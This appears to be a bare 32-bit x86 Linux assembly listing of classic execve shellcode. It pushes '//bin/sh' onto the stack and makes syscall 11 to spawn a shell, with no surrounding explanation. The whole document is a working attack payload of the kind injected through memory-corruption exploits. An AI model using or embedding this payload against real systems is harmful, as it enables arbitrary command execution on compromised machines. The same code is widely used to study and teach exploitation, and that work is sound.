bits 32
global main

main:
    xor edx,edx
    push edx
    push 0x68732f6e
    push 0x69622f2f
    mov ebx,esp
    push edx ; 0
    push ebx
    mov ecx,esp
    mov al, 11 ; execve
    int 0x80
